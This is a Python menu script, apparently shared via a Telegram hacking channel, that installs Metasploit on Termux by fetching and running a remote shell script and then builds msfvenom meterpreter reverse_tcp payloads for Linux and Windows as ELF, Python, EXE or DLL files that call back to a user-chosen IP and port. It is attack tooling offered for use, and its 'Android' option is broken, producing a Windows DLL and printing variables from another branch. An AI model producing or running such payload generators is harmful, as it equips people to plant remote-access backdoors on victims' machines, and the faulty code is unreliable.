#https://t.me/CyberSpyWare 
import time , os , socket
from socket import gethostbyname , gethostname

#color 
red = '\033[31m'
green = '\033[32m'

def Metasploit():
    print(f'''

   {red}[X] {green}CYBER-PAYLOAD-CREATOR [X]{red}

   {green}Programmer : {red}@CyberTrojan

   {green}GitHub : CyberX101

   {green}Telegram : {red}https://t.me/CyberSpyWare
  
     ''')
    options = f'''
    {green}[1] - {red}Install Metasploit 

    {green}[2] - {red}Create Payload With Metasploit

    {green}[3] - {red}Get your ip

    {green}[00] - {red}Exit

    '''
    print(options)

    pass

Metasploit()
CyberPayload = True

while CyberPayload:
    Cyber = input(f'{green}[#] {red}Select number : {green} ')
    if Cyber == "1":
        time.sleep(1)
        print(f'{green}[#] {red}Installing Metasploit ..')
        time.sleep(2)
        os.system('pkg install -y wget')
        os.system('cd /data/data/com.termux/files/home && wget https://Auxilus.github.io/metasploit.sh')
        os.system("cd /data/data/com.termux/files/home && bash metasploit.sh")
        os.system("cd /data/data/com.termux/files/home && cd metasploit-framework")
        os.system("cd /data/data/com.termux/files/home && gem install bundle --pre")
        os.system("cd /data/data/com.termux/files/home && bundle config build.nokogiri --use-system-libraries")
        os.system("cd /data/data/com.termux/files/home && bundle install")
        os.system("cd /data/data/com.termux/files/home")
        os.system("cd /data/data/com.termux/files/home")
        print(f"{red}-"*60)
        print(f"{green}[#] {red}Metaslpoit Installed Successfully")
        print(f"{red}-"*60)
        menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
        if menu == 'y':
            time.sleep(1)
            Metasploit()
        else:
            break
    elif Cyber == "2":
        time.sleep(1)
        print(f'''

        {green}[1] - {red}Payload for Linux x86

        {green}[2] - {red}Payload for Linux x64

        {green}[3] - {red}Payload for Windows x64

        {green}[4] - {red}Payload for Windows x86

        {green}[5] - {red}Payload For Android 

        
        ''')
        Platfrom = input(f'{green}[#] {red}Pleas Select Platfrom : {green} ')
        if Platfrom == "1":
            time.sleep(1)
            Linux86_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
            Linux86_ip = input(f'{green}[!] {red}Enter Ip : {green}')
            Linux86_port = input(f'{green}[!] {red}Enter Port : {green}')
            time.sleep(3)
            print(f'{red}-'*60)
            print(f'{green}[#] {red}Payload Name : {green}' + Linux86_Payload )
            print(f'{green}[#] {red}ip :  {green}' + Linux86_ip)
            print(f'{green}[#] {red}Port : {green}' + Linux86_port)
            print(f'{red}-'*60)
            time.sleep(1)
            os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={Linux86_ip} LPORT={Linux86_port} -o {Linux86_Payload}.elf')
            print(f'{red}-'*60)
            print(f'{green}[!!] {red}payload Created Successfully ')
            print(f'{red}-'*60)
            menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
            if menu == 'y':
                time.sleep(1)
                Metasploit()
            else:
                break
        elif Platfrom == "2":
            time.sleep(1)
            Linux64_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
            Linux64_ip = input(f'{green}[!] {red}Enter Ip : {green}')
            Linux64_port = input(f'{green}[!] {red}Enter Port : {green}')
            time.sleep(3)
            print(f'{red}-'*60)
            print(f'{green}[#] {red}Payload Name : {green}' + Linux64_Payload )
            print(f'{green}[#] {red}ip :  {green}' + Linux64_ip)
            print(f'{green}[#] {red}Port : {green}' + Linux64_port)
            print(f'{red}-'*60)

            time.sleep(1)
            os.system(f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={Linux64_ip} LPORT={Linux64_port} -o {Linux64_Payload}.elf')
            print(f'{red}-'*60)
            print(f'{green}[!!] {red}payload Created Successfully ')
            print(f'{red}-'*60)
            menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
            if menu == 'y':
                time.sleep(1)
                Metasploit()
            else:
                break
        elif Platfrom == "3":
            time.sleep(1)
            print(f''' 

            {green}[1] - {red}Payload.py (python)

            {green}[2] - {red}Payload.exe (exe)

            {green}[3] - {red}Payload.dll (dll)

            ''')

            Win64_Pay = input(f'{green}[!] {red}Pleas Select Number : {green}')

            if Win64_Pay == "1":
                time.sleep(1)
                WinPy64_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
                WinPy64_ip = input(f'{green}[!] {red}Enter Ip : {green}')
                WinPy64_port = input(f'{green}[!] {red}Enter Port : {green}')
                time.sleep(3)
                print(f'{red}-'*60)
                print(f'{green}[#] {red}Payload Name : {green}' + WinPy64_Payload )
                print(f'{green}[#] {red}ip :  {green}' + WinPy64_ip)
                print(f'{green}[#] {red}Port : {green}' + WinPy64_port)
                print(f'{red}-'*60)
                time.sleep(1)
                os.system(f'msfvenom -p python/meterpreter/reverse_tcp LHOST={WinPy64_ip} LPORT={WinPy64_port} -o {WinPy64_Payload}.py')
                print(f'{red}-'*60)
                print(f'{green}[!!] {red}payload Created Successfully ')
                print(f'{red}-'*60)
                menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
                if menu == 'y':
                    time.sleep(1)
                    Metasploit()
                else:
                    break
            elif Win64_Pay == "2":
                time.sleep(1)
                WinExe64_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
                WinExe64_ip = input(f'{green}[!] {red}Enter Ip : {green}')
                WinExe64_port = input(f'{green}[!] {red}Enter Port : {green}')
                time.sleep(3)
                print(f'{red}-'*60)
                print(f'{green}[#] {red}Payload Name : {green}' + WinExe64_Payload )
                print(f'{green}[#] {red}ip :  {green}' + WinExe64_ip)
                print(f'{green}[#] {red}Port : {green}' + WinExe64_port)
                print(f'{red}-'*60)
                time.sleep(1)
                os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={WinExe64_ip} LPORT={WinExe64_port} -ax64 -o {WinExe64_Payload}.exe')
                print(f'{red}-'*60)
                print(f'{green}[!!] {red}payload Created Successfully ')
                print(f'{red}-'*60)
                menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
                if menu == 'y':
                    time.sleep(1)
                    Metasploit()
                else:
                    break
            elif Win64_Pay == "3":
                time.sleep(1)
                WinDll64_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
                WinDll64_ip = input(f'{green}[!] {red}Enter Ip : {green}')
                WinDll64_port = input(f'{green}[!] {red}Enter Port : {green}')
                time.sleep(3)
                print(f'{red}-'*60)
                print(f'{green}[#] {red}Payload Name : {green}' + WinDll64_Payload )
                print(f'{green}[#] {red}ip :  {green}' + WinDll64_ip)
                print(f'{green}[#] {red}Port : {green}' + WinDll64_port)
                print(f'{red}-'*60)
                time.sleep(1)
                os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST={WinDll64_ip} LPORT={WinDll64_port} -o {WinDll64_Payload}.dll')
                print(f'{red}-'*60)
                print(f'{green}[!!] {red}payload Created Successfully ')
                print(f'{red}-'*60)
                menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
                if menu == 'y':
                    time.sleep(1)
                    Metasploit()
                else:
                    break
        elif Platfrom == "4":
            time.sleep(1)
            print(f''' 

            {green}[1] - {red}Payload.py (python)

            {green}[2] - {red}Payload.exe (exe)

            {green}[3] - {red}Payload.dll (dll)

            ''')

            Win86_Pay = input(f'{green}[!] {red}Pleas Select Number : {green}')

            if Win86_Pay == "1":
                time.sleep(1)
                WinPy86_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
                WinPy86_ip = input(f'{green}[!] {red}Enter Ip : {green}')
                WinPy86_port = input(f'{green}[!] {red}Enter Port : {green}')
                time.sleep(3)
                print(f'{red}-'*60)
                print(f'{green}[#] {red}Payload Name : {green}' + WinPy86_Payload )
                print(f'{green}[#] {red}ip :  {green}' + WinPy86_ip)
                print(f'{green}[#] {red}Port : {green}' + WinPy86_port)
                print(f'{red}-'*60)
                time.sleep(1)
                os.system(f'msfvenom -p python/meterpreter/reverse_tcp LHOST={WinPy86_ip} LPORT={WinPy86_port} -o {WinPy86_Payload}.py')
                print(f'{red}-'*60)
                print(f'{green}[!!] {red}payload Created Successfully ')
                print(f'{red}-'*60)
                menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
                if menu == 'y':
                    time.sleep(1)
                    Metasploit()
                else:
                    break
            elif Win86_Pay == "2":
                time.sleep(1)
                WinExe86_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
                WinExe86_ip = input(f'{green}[!] {red}Enter Ip : {green}')
                WinExe86_port = input(f'{green}[!] {red}Enter Port : {green}')
                time.sleep(3)
                print(f'{red}-'*60)
                print(f'{green}[#] {red}Payload Name : {green}' + WinExe86_Payload )
                print(f'{green}[#] {red}ip :  {green}' + WinExe86_ip)
                print(f'{green}[#] {red}Port : {green}' + WinExe86_port)
                print(f'{red}-'*60)
                time.sleep(1)
                os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={WinExe86_ip} LPORT={WinExe86_port} -ax86 -o {WinExe86_Payload}.exe')
                print(f'{red}-'*60)
                print(f'{green}[!!] {red}payload Created Successfully ')
                print(f'{red}-'*60)
                menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
                if menu == 'y':
                    time.sleep(1)
                    Metasploit()
                else:
                    break
            elif Win86_Pay == "3":
                time.sleep(1)
                WinDll86_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
                WinDll86_ip = input(f'{green}[!] {red}Enter Ip : {green}')
                WinDll86_port = input(f'{green}[!] {red}Enter Port : {green}')
                time.sleep(3)
                print(f'{red}-'*60)
                print(f'{green}[#] {red}Payload Name : {green}' + WinDll86_Payload )
                print(f'{green}[#] {red}ip :  {green}' + WinDll86_ip)
                print(f'{green}[#] {red}Port : {green}' + WinDll86_port)
                print(f'{red}-'*60)
                time.sleep(1)
                os.system(f'msfvenom -p windows/meterpreter/reverse_tcp -ax86 -f dll LHOST={WinDll86_ip} LPORT={WinDll86_port} -o {WinDll86_Payload}.dll')
                print(f'{red}-'*60)
                print(f'{green}[!!] {red}payload Created Successfully ')
                print(f'{red}-'*60)
                menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
                if menu == 'y':
                    time.sleep(1)
                    Metasploit()
                else:
                    break
        elif Platfrom == "5":
            time.sleep(1)
            Apk_Payload = input(f'{green}[!] {red}Enter Name Payload : {green}')
            Apk_Ip = input(f'{green}[!] {red}Enter Ip : {green}')
            Apk_Port = input(f'{green}[!] {red}Enter Port : {green}')
            time.sleep(3)
            print(f'{red}-'*60)
            print(f'{green}[#] {red}Payload Name : {green}' + Apk_Payload )
            print(f'{green}[#] {red}ip :  {green}' + WinDll86_ip)
            print(f'{green}[#] {red}Port : {green}' + WinDll86_port)
            print(f'{red}-'*60)
            time.sleep(1)
            os.system(f'msfvenom -p windows/meterpreter/reverse_tcp -ax86 -f dll LHOST={Apk_Ip} LPORT={Apk_Port} -o {Apk_Payload}.dll')
            print(f'{red}-'*60)
            print(f'{green}[!!] {red}payload Created Successfully ')
            print(f'{red}-'*60)
            menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
            if menu == 'y':
                time.sleep(1)
                Metasploit()
            else:
                break
    elif Cyber == "3":
        ip = gethostbyname(gethostname())
        print(f'{green}[^_^] {red}Your IP : {green}' + ip )
        menu = input(f'{green}[!] {red}Back To Menu? (y/n): {green}')
        if menu == 'y':
            time.sleep(1)
            Metasploit()
        else:
            break
    elif Cyber == "00":
        break


            

    



                                                                                                    

        
    



        
   






